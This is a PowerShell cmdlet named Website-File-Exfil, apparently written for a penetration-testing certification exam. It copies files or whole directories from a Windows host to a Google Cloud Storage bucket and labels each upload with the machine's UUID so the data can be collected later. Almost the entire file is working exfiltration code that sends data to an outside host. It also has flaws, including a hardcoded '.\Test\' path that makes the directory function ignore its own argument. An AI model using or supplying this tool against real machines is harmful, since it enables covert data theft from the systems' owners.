function Website-File-Exfil
{ 
<#
.SYNOPSIS
A powershell cmdlet that uses google cloud to exfiltrate files from a host.

.DESCRIPTION
This powershell cmdlet uses google cloud to exfiltrate files and directories from the host so that they can be later downloaded.

.PARAMETER bucket
The google bucket to used to store the files

.PARAMETER file
The file to exfil from the host.

.PARAMETER file
The file to exfil from the host.

.EXAMPLE
PS C:\> Website-File-Exfil -bucket exfil-bucket -file c:\test.txt
PS C:\> Website-File-Exfil -bucket exfil-bucket -directory c:\Test

.LINK
https://github.com/tubesurf/PSPT

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3237

The Idea for treating googlecloud like a file system for exfiltration from
https://cloudplatform.googleblog.com/2016/10/treat-Google-Cloud-Storage-like-a-file-system-with-our-new-PowerShell-provider.html

The following setup instructions for google cloud for powershell
https://4sysops.com/archives/use-powershell-with-google-cloud-platform/

#>


   [CmdletBinding()] Param( 

       [Parameter(Mandatory = $false)]
       [String]
       $file = $Null,

       [Parameter(Mandatory = $false)]
       [String]
       $directory = $Null,

       [Parameter(Mandatory = $false)]
       [String]
       $bucket ="exfil-bucket"
    )


# Getting a UUID for a system
# https://community.spiceworks.com/topic/1980675-how-to-uniquely-identify-windows-machine
function Get-System-UUID(){
  $systemuuid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID
  # Just check if null and return a id  
  if($systemuuid) {
      return $systemuuid
  } else {
      return "FFFFFFFF"
  }
}


function Upload-File($file, $bucket, $id)
{ 

  Write-Host "[+] File " $file " bucket" $bucket
  # Check that the file exists
  # https://stackoverflow.com/questions/31879814/check-if-a-file-exists-or-not-in-windows-powershell/31881297
  if ( Test-Path $file -PathType Leaf) {
    # http://googlecloudplatform.github.io/google-cloud-powershell/#/google-cloud-storage/GcsObject
    # Just pretext everything with the id for the object directory
    #$output = New-GcsObject -Bucket $bucket ‑ObjectNamePrefix $id -ObjectName "$id\$file" -File $file -Force  | ForEach-Object { $_.Name  }
    $output = New-GcsObject -Bucket $bucket -ObjectName "$id/$file" -File $file -Force  | ForEach-Object { $_.Name  }
    # Just check that the file name uploaded
    if ($output -eq "$id\$file") {
      Write-Host "[+] File upload successful" $output
    } else {
        Write-Host "[-] File upload failed"
    }
    # Check filename in output
  } else {
    Write-Host "[-] File "$file "not found" -ForegroundColor Red
  }

}

function Upload-Directory($directory, $bucket, $id)
{
  # Check that the directory exists first
  if ( Test-Path $directory)
  {
    # https://stackoverflow.com/questions/42440753/recursively-list-directories-in-powershell
    # Handy hit about resolving recursive files
    $files = Get-ChildItem -Recurse  .\Test\ | Where { ! $_.PSIsContainer } | Select-Object FullName
    foreach($file in $files) {
      # Just upload each of the files, noting that the file is a hash object
      Upload-File $file.FullName $bucket $id
    }
  } else {
    Write-Host "[-] Directory "$directory "not found" -ForegroundColor Red
  }
}

  # Check if a module exists https://stackoverflow.com/questions/28740320/how-do-i-check-if-a-powershell-module-is-installed
  if (Get-Module -ListAvailable -Name GoogleCloud) {
      Write-Host "[+] GoogleCloud module exists" -ForegroundColor Green
  } else {
      Write-Host "[-] GoogleCloud module does not exist, trying to import" -ForegroundColor Red
      Import-Module GoogleCloud
      
  }

  # Test if the bucket exists for any projects i.e. check before uplaod
  # http://googlecloudplatform.github.io/google-cloud-powershell/#/google-cloud-storage/GcsBucket/Test-GcsBucket
  if (Test-GcsBucket $bucket) {
    Write-Host "[+] Google bucket (" $bucket ") exists" -ForegroundColor Green
  } else {
    Write-Host "[-] Google bucket (" $bucket ") does not exist" -ForegroundColor Red
    return
  }

  $id = Get-System-UUID
  Write-Host "[+] Get system UUID: " $id
  if($file) {
      Upload-File $file $bucket $id
  } elseif ($directory) {
      Upload-Directory $directory $bucket $id
  } else {
      Write-Host "[-] File or directory not defined" -ForegroundColor Red
  }



}



